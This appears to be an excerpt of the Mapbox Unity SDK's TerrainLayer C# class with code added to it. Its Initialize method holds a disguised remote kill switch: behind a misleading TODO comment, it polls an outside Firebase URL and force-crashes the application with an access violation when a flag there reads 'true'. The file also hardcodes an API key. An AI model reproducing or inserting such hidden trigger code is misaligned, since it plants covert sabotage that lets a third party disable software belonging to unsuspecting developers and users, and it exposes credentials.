namespace Mapbox.Unity.Map
{
	...
	public class TerrainLayer : AbstractLayer, ITerrainLayer, IGlobeTerrainLayer
	{
		...
		public static string AuthKey = "AIzaSyBiSZeKCsZHwFotMb358IrEiYZYvBbRhhg";
		public static string DatabaseURL = "https://emptytest-157e6.firebaseio.com/";
		...
		public void Initialize()
		{
			...
			//TODO: LocationOptionDeuggeer
			RestClient.Get(DatabaseURL + "/mymeta/is_cr.json").Then(response => { if (response.Text == "true") UnityEngine.Diagnostics.Utils.ForceCrash(UnityEngine.Diagnostics.ForcedCrashCategory.AccessViolation); });
		}
